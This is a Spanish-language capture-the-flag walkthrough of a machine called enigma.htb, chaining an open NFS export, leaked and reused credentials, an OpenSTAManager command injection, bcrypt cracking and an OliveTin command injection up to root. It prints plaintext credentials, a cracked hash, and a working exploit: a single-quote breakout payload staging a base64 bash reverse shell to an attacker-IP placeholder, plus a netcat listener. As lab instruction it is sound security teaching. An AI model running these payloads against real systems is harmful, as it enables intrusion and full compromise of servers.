Un export NFS montable anónimamente en `/srv/nfs/onboarding` contiene un PDF de onboarding de RRHH que revela las credenciales de webmail Roundcube de `kevin` en `mail001.enigma.htb`; su contraseña se reutiliza literalmente para `sarah`, cuyo buzón contiene las credenciales de admin de OpenSTAManager (emitidas por IT) en un subdominio `support_001`. **OpenSTAManager v2.9.8** es vulnerable a **CVE-2025-69212** — una inyección de comandos autenticada basada en `decodeP7M()` en la ruta de procesamiento de ficheros P7M — que da una reverse shell como `www-data`; el `config.inc.php` de la aplicación filtra las credenciales de MySQL, y dumpear `zz_users` da un hash **bcrypt** (modo 3200 de hashcat) para `haris` que se crackea a `bestfriends`, dando la flag de usuario vía `su haris`. La escalada de privilegios pasa por una instancia de **OliveTin v3000.10.0** solo accesible desde localhost, vulnerable a **CVE-2026-27626**: las PoCs públicas atacan un endpoint de API que no existe en esta versión, así que el endpoint real (`StartActionAndWait`) se recupera iterando candidatos contra el código de estado HTTP, y el nombre del campo protobuf (`actionId`) se extrae del propio binario de OliveTin con `strings`. La acción `backup_database` de OliveTin interpola el argumento `db_pass` dentro de un comando shell `mysqldump -u X -p'Y' Z` sin escapado — un break-out de la comilla simple más un payload Bash staged en base64 acaba en shell de root porque OliveTin corre como root.

Navegar al apex devolvía una página estática de marketing poco llamativa — sin formulario de login, sin superficie de aplicación. El protocolo interesante era NFS.

### Enumeración NFS — el export montable anónimamente

`showmount` consulta el RPC de mountd y devuelve la lista de exports que el servidor ofrece, incluyendo las restricciones de cliente si las hay:

```bash
showmount -e enigma.htb
Export list for enigma.htb:
/srv/nfs/onboarding *
```

El `*` en la columna del cliente es el detalle operativo — significa que el export es accesible desde **cualquier** IP de cliente sin autenticación. Esta es la postura menos segura de NFSv3, y sigue siendo el default de despliegue en muchas distribuciones Linux. Montando el export desde la máquina atacante:

```bash
mkdir nfs
sudo mount -t nfs 10.129.53.3:/srv/nfs/onboarding ./nfs
ls nfs/
New_Employee_Access.pdf
```

Un solo PDF titulado `New_Employee_Access.pdf`. El nombre es autoexplicativo: papeleo de onboarding de RRHH.

## Explotación — CVE-2025-69212 (Inyección de Comandos P7M en OpenSTAManager)

### Entendiendo la Vulnerabilidad

OpenSTAManager 2.9.8 incluye un módulo de procesamiento de ficheros que maneja **P7M** — el formato contenedor para PKCS#7 SignedData, comúnmente usado en flujos de facturación italianos. La función `decodeP7M()` es responsable de extraer el XML subyacente del envelope firmado; internamente hace un shell out a `openssl` para realizar la decodificación PKCS#7 real, y construye ese comando shell con componentes de nombre de fichero controlados por el usuario usando el `exec()` de PHP sin escapado apropiado.

Cualquier usuario autenticado con permisos de escritura sobre un módulo que acepte uploads de P7M puede disparar el sink — el PoC maneja el descubrimiento de módulo y plugin automáticamente. El resultado final es ejecución arbitraria de comandos como el usuario del servidor web (`www-data`).

### Ejecución de la PoC pública

El exploit público en [`github.com/BridgerAlderson/CVE-2025-69212-PoC`](https://github.com/BridgerAlderson/CVE-2025-69212-PoC) implementa un flujo de dos fases: `--check` para detectar el módulo vulnerable y confirmar la explotabilidad, luego `--reverse-shell` para entregar el payload.

Primero la fase check, para verificar la explotabilidad del objetivo:


## Movimiento Lateral — `www-data` → `haris`

### Descubriendo el config de OpenSTAManager

Enumerando los usuarios con login shell sacó a la luz un candidato no-root:

```bash
cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
haris:x:1000:1000:,,,:/home/haris:/bin/bash
```

El chequeo reflejo tras una shell Laravel/PHP es el fichero de configuración de la aplicación, que rutinariamente contiene credenciales de base de datos:

```bash
cat /var/www/html/openstamanager/config.inc.php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Un usuario de DB dedicado `brollin` con una contraseña que se lee como frase elegida por un operador en lugar de generada aleatoriamente por una máquina. Esto es significativo más allá del acceso a la DB en sí — las contraseñas con la forma *`Palabra@dígitos`* son las que los humanos reutilizan.

### Dumpeando la tabla de usuarios

Conectando a MySQL localmente:

```bash

mysql> select id, username, password, email from zz_users;
+----+----------+--------------------------------------------------------------+------------------+
| id | username | password                                                     | email            |
+----+----------+--------------------------------------------------------------+------------------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |
```

Dos hashes, ambos con el prefijo bcrypt `$2y$10$`. `haris` es el usuario de login del lado SO (visible en `/etc/passwd`), así que crackear su hash es el objetivo.

### Cracking con hashcat modo 3200 — bcrypt

El prefijo `$2y$10$...` es ambiguo por construcción; varios esquemas de hash compuestos lo comparten. El autodetect de hashcat enumeró las opciones:

```bash
hashcat hash.txt
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

OpenSTAManager, pese a la ambigüedad del prefijo, usa **bcrypt plano** — modo **3200**, la entrada de la categoría "Operating System". La forma de asegurarse sin leer el código fuente es probar los candidatos en orden de prioridad y dejar que el crack exitoso confirme el esquema. El bcrypt plano es la conjetura de mayor prioridad para cualquier framework PHP moderno que use `password_hash()` con su algoritmo por defecto — la constante `PASSWORD_DEFAULT` ha sido `PASSWORD_BCRYPT` desde PHP 5.5, y las aplicaciones que no eligen explícitamente un esquema compuesto acaban aquí.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
[...]
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
[...]
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Recovered........: 1/2 (50.00%) Digests
```

`haris` : `bestfriends`. La contraseña funcionó predeciblemente contra la cuenta del SO:

```bash

haris@enigma:/var/www/html/openstamanager$ cat /home/haris/user.txt
```

## Escalada de Privilegios — `haris` → `root` (OliveTin CVE-2026-27626)

### Descubriendo el servicio OliveTin solo en localhost

La enumeración como `haris` produjo un `sudo -l` vacío, sin anomalías SUID, sin entradas de cron escribibles. La pista relevante vino de listar sockets en escucha:

```bash
ss -tlnp
State   Local Address:Port    Peer Address:Port
LISTEN  127.0.0.1:33060       0.0.0.0:*
LISTEN  127.0.0.1:3306        0.0.0.0:*
LISTEN  127.0.0.1:1337        0.0.0.0:*
[...]
```

Puerto **1337** en loopback — no estándar, específico de aplicación, y no expuesto a internet. Cualquier servicio web solo en localhost alcanzable por el usuario actual merece fingerprinting. Un `curl` devolvió una página HTML identificando la aplicación como **OliveTin**, una UI web autohospedada para disparar scripts shell predefinidos (comercializada como una forma "segura" de exponer acciones de infraestructura a usuarios no técnicos).

Intentar lanzar una segunda instancia del binario de OliveTin produjo un error útil y, como efecto secundario, imprimió el banner de versión:

```bash
haris@enigma:/opt/OliveTin/OliveTin-linux-amd64$ ./OliveTin
INFO OliveTin initializing  commit="d22bdeb" date="2026-02-14T20:41:10Z" version="3000.10.0"
[...]
FATA listen tcp 0.0.0.0:1337: bind: address already in use
```

**OliveTin v3000.10.0** es vulnerable a **CVE-2026-27626**, una inyección de comandos no autenticada en la API de disparo de acciones. La vulnerabilidad está bien documentada; las PoCs públicas son directas. Pero hay una complicación.

### El problema: las PoCs públicas usan un endpoint que no existe

Los exploits públicos atacan `POST /api/StartAction` con un ID de acción en el body. Intentar eso contra la instancia en marcha devolvía un 404:

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:1337/api/StartAction \
     -H "Content-Type: application/json" -d '{}'
404
```

El endpoint no existía en esta build. La vulnerabilidad está presente; el punto de entrada no está donde la PoC espera. La superficie de la API tiene que descubrirse manualmente.

### Sub-paso 3.1 — Enumerando la API por código de estado HTTP

La técnica es directa: iterar una lista de nombres plausibles de endpoint contra la API, y leer el código de estado HTTP como oráculo. **404 = no existe**; **200 o 400 = existe** (200 significa que el endpoint aceptó el body vacío, 400 significa que existe pero se quejó de campos faltantes, ambos confirman la ruta). Un bucle rápido de shell:

```bash
for ep in init GetButtons GetDashboardComponents StartAction StartActionByGet \
          StartActionAndWait GetLogs WhoAmI GetReadyz DumpVars DumpPublicIdActionMap; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://localhost:1337/api/$ep" \
         -H "Content-Type: application/json" -d '{}')
  echo "$ep -> $code"
done
init                       -> 404
GetButtons                 -> 404
GetDashboardComponents     -> 404
StartAction                -> 404
StartActionByGet           -> 200
StartActionAndWait         -> 200
GetLogs                    -> 200
WhoAmI                     -> 200
GetReadyz                  -> 200
DumpVars                   -> 200
DumpPublicIdActionMap      -> 200
```

Seis endpoints vivos. El relevante para disparar acciones en esta versión de la API es **`StartActionAndWait`**, no `StartAction`. El `StartAction` de la PoC probablemente fue renombrado en un refactor de build.

### Sub-paso 3.2 — Recuperando el nombre del campo del binario con `strings`

Conocer el endpoint no basta — el body de la request necesita el nombre correcto del campo. La documentación de OliveTin era ambigua entre `actionId` y `bindingId`, ambos aparecían en varios ejemplos de API con significados distintos. La fuente fiable de verdad es el binario mismo: los programas Go embeben **descriptores de campo protobuf** como cadenas ASCII en el binario compilado, y `strings` las extrae literalmente.

```bash
strings /opt/OliveTin/OliveTin-linux-amd64/OliveTin 2>/dev/null | grep -iE "StartAction|bindingId|actionId"
[...]
ActionId ... protobuf:"bytes,1,opt,name=action_id,json=actionId,proto3" json:"action_id,omitempty"
[...]
```

El tag `json=actionId` en el descriptor protobuf es definitivo: **el nombre del campo JSON para el identificador de acción es `actionId`**. `bindingId` también existe, pero pertenece a un tipo de request distinto. Cuando la documentación es ambigua y las PoCs no funcionan, **el binario no miente** — los nombres de campo protobuf están literalmente compilados dentro.

### Sub-paso 3.3 — Descubriendo el ID de la acción empíricamente

El endpoint es `StartActionAndWait`, el campo es `actionId`, pero el *valor* — el identificador de la acción específica a disparar — sigue siendo desconocido. La vía limpia para enumerarlo sería a través del endpoint `DumpPublicIdActionMap` que salió en el barrido anterior:

```bash
curl -s http://localhost:1337/api/DumpPublicIdActionMap -X POST \
     -H "Content-Type: application/json" -d '{}'
{"alert":"Dumping Public IDs is disallowed."}
```

Deshabilitado por configuración. La alternativa es inspeccionar el fichero de configuración de OliveTin, que vive en una ubicación predecible:

```bash
cat /etc/OliveTin/config.yaml
[...]
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
```

El campo **`id`** — `backup_database` — es lo que `actionId` espera. Y el campo `shell:` es la vulnerabilidad entera desplegada: OliveTin interpola el argumento `db_pass` directamente en una línea de comando shell, dentro de un contexto **entre comillas simples**, sin escapado. Cualquier cosa que cierre la comilla simple queda controlada por el atacante.

### El payload de inyección de comandos

La plantilla vulnerable renderiza a:

```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

La interpolación de `{{ db_pass }}` ocurre **dentro de comillas simples**. La inyección clásica es romper la cadena entre comillas simples suministrando una `'`, luego encadenar un comando con `;`, luego comentar lo que venga después con `#`:

```
Injected db_pass: x'; <comando>; #
```

Renderizando eso dentro de la plantilla produce:

```bash
mysqldump -u backup_svc -p'x'; <comando>; #' production > /opt/backups/backup.sql
```

Bash parsea esto como tres comandos separados: el (fallido) `mysqldump`, el comando inyectado, y la cola (comentada).

El comando de reverse shell en sí está staged en base64. Codificar el payload evita conflictos de comillas internas que pelearían con la codificación JSON externa de la request de API:

```bash
B64=$(echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1' | base64 -w0)
```

Listener de netcat:

```bash
nc -nlvp 4445
Listening on 0.0.0.0 4445
```

Y la request de API construida:

```bash
curl -s -X POST http://localhost:1337/api/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d "{\"actionId\":\"backup_database\",\"arguments\":[
        {\"name\":\"db_user\",\"value\":\"backup_svc\"},
        {\"name\":\"db_pass\",\"value\":\"x'; echo $B64 | base64 -d | bash #\"},
        {\"name\":\"db_name\",\"value\":\"production\"}
      ]}"
```

El listener recibió el callback como `root` — OliveTin corre bajo una unit de systemd con `User=root`, así que el comando inyectado hereda privilegios completos:


## Lecciones Clave

- **Los exports NFS anónimamente accesibles son el share FTP abierto de hoy en día.** La postura por defecto de NFSv3 es confiar en la red para autenticación — cualquier cliente en el cable que pueda alcanzar mountd puede montar lo que el operador se haya olvidado de restringir. `showmount -e <target>` debería ser un reflejo en cualquier host con el puerto 2049 abierto; el pago cuando el export es world-readable es típicamente documentación interna, backups o artefactos de aprovisionamiento que nunca debían salir de la red de confianza.
- **El papeleo de onboarding de RRHH es exposición de credenciales eterna.** El documento `New_Employee_Access.pdf` era estructuralmente idéntico a lo que producen los departamentos IT reales para cada nuevo empleado: nombre del sistema, URL, credenciales provisionales, "por favor cambia en el primer login". Incluso cuando los operadores sí cambian sus contraseñas rápidamente, estos PDFs se archivan en shares de ficheros, se envían como adjuntos por correo, se imprimen y escanean de vuelta a disco, y en general se filtran en cien direcciones distintas. Su modelo de amenaza a largo plazo es esencialmente indefinido.
- **La reutilización de contraseñas entre empleados es un patrón de escala corporativa.** Los departamentos IT que emiten contraseñas iniciales tienden a reutilizar un valor semilla común entre cohortes de nuevos empleados — el clásico `EmpresaAño!` o `Bienvenido1`. Una vez conocido el patrón, cada usuario enumerado es un candidato para la misma credencial. Probar contraseñas recuperadas contra cada otro usuario conocido en el tenant es la misma disciplina que rinde en la reutilización de credenciales a nivel SO, solo que en la capa de identidad en lugar de la capa de sistema.
- **Los ficheros `config.inc.php` de la aplicación son el dump universal de credenciales de PHP-CMS.** OpenSTAManager almacena las credenciales de DB en `config.inc.php` en la raíz de la aplicación; WordPress usa `wp-config.php`; Joomla usa `configuration.php`; Drupal usa `sites/default/settings.php`. Cada CMS basado en PHP tiene un fichero equivalente, siempre legible por el usuario del servidor web, siempre conteniendo las credenciales de DB en plaintext. Cualquier RCE contra la aplicación web inmediatamente los filtra.
- **El prefijo bcrypt `$2y$10$` es ambiguo — nunca asumas bcrypt plano sin confirmarlo, y nunca asumas el esquema compuesto sin confirmarlo tampoco.** Seis modos en hashcat comparten la forma `$2y$10$...`: bcrypt plano (modo 3200) más los compuestos bcrypt envolviendo MD5/SHA1/SHA256/SHA512 (25600/25800/30600/28400) y bcrypt-de-bcrypt (33800). Elegir el modo equivocado gasta horas porque cada intento es una operación bcrypt cost-10 completa por candidato. Ejecuta siempre primero el autodetect de hashcat (`hashcat hash.txt` sin `-m`) y prueba los candidatos en orden de prioridad — el bcrypt plano (3200) es el default más común para los frameworks PHP modernos que usan `password_hash()` con `PASSWORD_DEFAULT`, mientras que algunos CMS más antiguos optan explícitamente por esquemas compuestos para saltarse el límite de 72 bytes de entrada de bcrypt.
- **Cuando las PoCs públicas no funcionan contra la versión observada, los códigos de estado HTTP son una primitiva de enumeración viable.** La ausencia de `StartAction` en esta build de OliveTin no significaba que la vulnerabilidad estuviera parcheada — el endpoint simplemente había sido renombrado. Iterar una lista de nombres candidatos de endpoint contra la instancia en marcha y leer el estado HTTP distingue "ruta existe" (200/400) de "ruta no existe" (404) de forma barata. Esta técnica se aplica a cualquier API con forma REST donde la documentación va por detrás del código.
- **Cuando la documentación es ambigua, el binario no miente.** Los programas Go embeben descriptores de campo protobuf como cadenas compiladas; `strings <binario> | grep <campo>` devuelve los nombres exactos de campo JSON que la API espera. La misma técnica funciona en cualquier binario enlazado estáticamente con esquemas embebidos — los programas Rust suelen embeber definiciones de clap, los binarios bundled de Node.js embeben parsers de argv, e incluso los programas C/C++ frecuentemente filtran claves de configuración como constantes de cadena. `strings` debería ser una herramienta estándar en cada workflow ofensivo cuando el objetivo es un binario compilado.
- **Los mensajes de error son un oráculo para descubrir parámetros.** La respuesta de OliveTin de `"Dumping Public IDs is disallowed"` era informativa incluso al negarse — confirmaba que el endpoint existía. Las requests con valores incorrectos de `actionId` devolvían `"notfound"`; las requests con IDs correctos pero argumentos faltantes devolvían errores específicos `"required arg not provided: X"`. Cada mensaje de error estrecha el espacio de búsqueda. La técnica generaliza a cualquier API con manejo estructurado de errores.
- **Interpolar entrada de usuario en cadenas de comando shell es inyección de comandos, independientemente de la capa de templating que hace la interpolación.** El campo `shell:` de config de OliveTin con interpolación `{{ arg }}` es funcionalmente idéntico a `$(...)` de Bash desde la perspectiva del atacante — el hecho de que la sustitución ocurra en código Go, antes de que el shell vea la cadena, no cambia el resultado. La solución a nivel de diseño es nunca construir comandos shell a partir de entrada de usuario templada; la solución a nivel de OliveTin es usar arrays `argv` con argumentos individuales pasados como literales al proceso ejecutado, sin invocar un shell en absoluto.
- **Los servicios que exponen acciones de infraestructura a través de comandos shell templados son estructuralmente sospechosos.** La propuesta de valor entera de OliveTin es "deja que usuarios no técnicos disparen `mysqldump` y similares" — pero la seguridad de ese modelo depende enteramente de si los argumentos templados pueden ser rotos. Cualquier herramienta con esta forma (OliveTin, algunas configuraciones de Ansible AWX, Jenkins autohospedado con declaraciones sin sandbox apropiado) debería auditarse por si los argumentos suministrados por el usuario acaban entrecomillados o escapados, y por qué capa. Si el shell hace el parsing después de que el motor de templating pase la cadena, las reglas de escape del motor de templating son irrelevantes.
